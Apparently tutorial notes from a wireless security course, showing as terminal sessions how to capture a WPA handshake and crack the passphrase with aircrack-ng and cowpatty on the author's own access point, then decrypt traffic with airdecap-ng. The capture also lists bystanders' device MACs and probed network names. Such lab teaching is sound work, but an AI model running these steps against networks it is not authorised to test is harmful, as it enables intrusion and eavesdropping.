#### Part 22: WPA-PSK Cracking 

Before connecting the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 51830  bytes 3435415 (3.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47066  bytes 33321752 (31.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 248  bytes 12512 (12.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 248  bytes 12512 (12.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```	
	
Connect the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 113  bytes 13062 (12.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 19058 (18.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig -a
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 124  bytes 13940 (13.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 20732 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 00:c0:ca:92:3c:89  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig wlan0 up
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 377  bytes 30254 (29.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 169  bytes 26425 (25.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ae:ac:75:a7:71:b2  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

Put the card in monitor mode

```sh
root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~# airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  400 NetworkManager
  569 dhclient
  804 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)

root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0mon	rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~#
```

Check for the monitor mode interface

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 518  bytes 40324 (39.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 236  bytes 35799 (34.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-92-3C-89-30-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 858  bytes 151521 (147.9 KiB)
        RX errors 0  dropped 858  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~#
```

Configure the AP to use ```WPA-PSK```

<---Add image here--->

```airodump-ng``` output for ```WPA``` networks

The moment a new client connects we capture the ```WPA handshake```

```sh
root@kali:~# airodump-ng --channel 4 --essid dlink wlan0mon --write wpa_psk_demo

 CH  4 ][ Elapsed: 20 mins ][ 2017-06-07 13:39 ][ WPA handshake: B4:75:0E:20:71:AE

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85  -34  74     8685     1386    0   4  54e. WPA  TKIP   PSK  dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 (not associated)   8C:8E:F2:5D:A9:87  -50    0 - 1      0        6
 (not associated)   84:11:9E:F2:0C:8D  -50    0 - 1      0      157
 (not associated)   5C:93:A2:A9:09:33  -61    0 - 1      0       18
 (not associated)   64:80:99:D7:8E:03  -67    0 - 1      0       44  ATT016,Kaiser
 (not associated)   C0:BD:D1:F6:35:32  -70    0 - 1      0        3  hds_auth_tablet
 (not associated)   F4:F5:D8:2F:99:D0  -70    0 - 1      0      102  Lowspeed
 (not associated)   D2:F2:96:BA:05:69  -60    0 - 1      0        2
 (not associated)   84:B5:41:4A:25:5C  -57    0 - 1      0        4
 (not associated)   AC:C3:3A:68:83:14  -67    0 - 1      0        2
 (not associated)   2C:CC:15:04:FC:B8  -70    0 - 1      0        1
 84:C9:B2:6D:0C:85  BC:9F:EF:69:35:19  -13   24e-24      0      351  HiddenSSID,dlink
```

Open the ```wpa_psk_demo-01.cap``` file in ```Wireshark```

Set the filter as ```eapol``` and see if you captured the 4 way handshake

<---Add image here--->

Cracking ```WPA-PSK``` using ```aircrack-ng```

```sh
root@kali:~# aircrack-ng wpa_psk_demo-01.cap -w dictionary.txt
Opening wpa_psk_demo-01.cap
Read 7117 packets.

   #  BSSID              ESSID                     Encryption

   1  84:C9:B2:6D:0C:85  dlink                     WPA (1 handshake)

Choosing first network as target.

Opening wpa_psk_demo-01.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc4

      [00:00:00] 1/1 keys tested (139.90 k/s)

      Time left: 0 seconds                                     100.00%

                         KEY FOUND! [ samplepsk123 ]


      Master Key     : 7F B8 B9 62 2C 1B CF 4D 39 37 9B 31 BD 5C FA C0
                       8F BB CB 2E D3 92 DB CF B8 C9 CA 7B 7D 1A D3 CE

      Transient Key  : D2 AC AF DF 2F 09 A1 17 FF C2 2A 1B 81 1A B0 7B
                       8C 13 89 E7 AD 5F EC 71 AE 38 30 4C 5E 1C AB 35
                       C8 0B 71 E5 F2 26 2B 56 E7 DC E1 A3 21 52 C6 D7
                       4D 35 1F 33 A1 69 34 1E BF 04 15 24 AC AA B6 1D

      EAPOL HMAC     : 05 31 A0 B4 79 5C 4B 51 13 CC 54 B8 0A 9A 64 89
root@kali:~#
```

Cracking ```WPA-PSK``` using ```cowpatty```

```sh
root@kali:~# cowpatty -f dictionary.txt -r wpa_psk_demo-01.cap -s dlink
cowpatty 4.6 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA/PSK passphrase.
Starting dictionary attack.  Please be patient.

The PSK is "samplepsk123".

1 passphrases tested in 0.00 seconds:  268.74 passphrases/second
root@kali:~#
```

Decrypting packets using ```airdecap-ng```

```sh
root@kali:~# airdecap-ng -e dlink -p samplepsk123 wpa_psk_demo-01.cap
Total number of packets read          7658
Total number of WEP data packets         0
Total number of WPA data packets      2845
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets       185
root@kali:~# ls -la wpa_psk_demo-01*
-rw-r--r-- 1 root root 681601 Jun  7 14:00 wpa_psk_demo-01.cap
-rw-r--r-- 1 root root   7682 Jun  7 14:00 wpa_psk_demo-01.csv
-rw-r--r-- 1 root root  28719 Jun  7 13:59 wpa_psk_demo-01-dec.cap
-rw-r--r-- 1 root root    586 Jun  7 14:00 wpa_psk_demo-01.kismet.csv
-rw-r--r-- 1 root root  85821 Jun  7 14:00 wpa_psk_demo-01.kismet.netxml
root@kali:~#
```

<---Add image here--->